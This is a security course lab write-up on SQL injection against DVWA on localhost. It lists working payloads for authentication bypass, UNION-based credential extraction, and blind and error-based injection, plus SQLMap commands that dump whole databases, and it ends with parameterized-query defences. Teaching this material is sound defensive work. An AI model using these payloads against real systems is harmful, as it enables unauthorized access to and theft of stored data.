# Section 9: SQL Injection Lab

## Objective
Identify, exploit, and prevent SQL injection vulnerabilities in web applications to understand this critical security threat.

## Learning Goals
- Understand how SQL injection attacks work
- Learn to identify vulnerable web applications
- Practice different types of SQL injection techniques
- Implement proper input validation and parameterized queries
- Use security tools to detect SQL injection vulnerabilities

## Lab Environment
- **Target Application:** DVWA (Damn Vulnerable Web Application)
- **Database:** MySQL
- **Tools:** Burp Suite, SQLMap, OWASP ZAP
- **Operating System:** Windows 10/11 with XAMPP

## Step-by-Step Procedures

### Step 1: Environment Setup
1. **Install XAMPP:**
   - Download and install XAMPP
   - Start Apache and MySQL services
   - Verify services are running on localhost

2. **Deploy DVWA:**
   - Download DVWA from GitHub
   - Extract to XAMPP htdocs directory
   - Configure database connection
   - Set security level to "Low" for initial testing

### Step 2: Basic SQL Injection Testing
1. **Navigate to SQL Injection page:**
   - Access DVWA SQL Injection module
   - Observe the user input form

2. **Test basic injection:**
   ```sql
   -- Basic injection to bypass authentication
   ' OR '1'='1
   
   -- Union-based injection
   ' UNION SELECT user, password FROM users--
   
   -- Error-based injection
   ' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
   ```

### Step 3: Advanced SQL Injection Techniques
1. **Blind SQL Injection:**
   ```sql
   -- Time-based blind injection
   '; WAITFOR DELAY '00:00:05'--
   
   -- Boolean-based blind injection
   ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--
   ```

2. **Database Enumeration:**
   ```sql
   -- List all databases
   ' UNION SELECT schema_name, NULL FROM information_schema.schemata--
   
   -- List tables in current database
   ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
   
   -- List columns in users table
   ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
   ```

### Step 4: Automated Testing with SQLMap
1. **Install SQLMap:**
   ```bash
   pip install sqlmap
   ```

2. **Basic SQLMap scan:**
   ```bash
   sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=your_session_id" --batch
   ```

3. **Comprehensive scan:**
   ```bash
   sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=your_session_id" --dbs --tables --columns --dump --batch
   ```

### Step 5: Prevention and Mitigation
1. **Implement parameterized queries:**
   ```php
   // Vulnerable code (DON'T DO THIS)
   $query = "SELECT * FROM users WHERE id = " . $_GET['id'];
   
   // Secure code (DO THIS)
   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
   $stmt->execute([$_GET['id']]);
   ```

2. **Input validation:**
   ```php
   // Validate and sanitize input
   $id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
   if ($id === false) {
       die("Invalid input");
   }
   ```

## Key Screenshots
- [Screenshot 1: DVWA login and setup]
- [Screenshot 2: Basic SQL injection bypass]
- [Screenshot 3: Union-based injection results]
- [Screenshot 4: SQLMap automated scan results]
- [Screenshot 5: Database enumeration output]
- [Screenshot 6: Prevention code examples]

## Key Takeaways
- **SQL injection is a critical vulnerability** affecting web applications worldwide
- **Input validation is essential:** Never trust user input without validation
- **Parameterized queries prevent injection:** Use prepared statements instead of string concatenation
- **Automated tools are powerful:** SQLMap can quickly identify and exploit vulnerabilities
- **Defense in depth:** Multiple layers of protection are necessary

## Attack Vectors
- **Authentication bypass:** Using ' OR '1'='1 to bypass login
- **Data extraction:** Using UNION queries to retrieve sensitive data
- **Database manipulation:** Inserting, updating, or deleting records
- **System compromise:** Accessing file system or executing commands

## Prevention Strategies
1. **Use parameterized queries/prepared statements**
2. **Implement proper input validation and sanitization**
3. **Apply principle of least privilege to database users**
4. **Use web application firewalls (WAF)**
5. **Regular security testing and code reviews**
6. **Keep databases and applications updated**

## Security Implications
- SQL injection is listed in OWASP Top 10
- Can lead to complete database compromise
- Often results in data breaches and compliance violations
- Critical for web application security professionals to understand

## Next Steps
- Practice with different database systems (MySQL, PostgreSQL, SQL Server)
- Learn about NoSQL injection attacks
- Study advanced evasion techniques
- Implement comprehensive prevention strategies

---
*Lab completed: September 10, 2025 | Duration: 2.5 hours | Status: ✅ Complete*
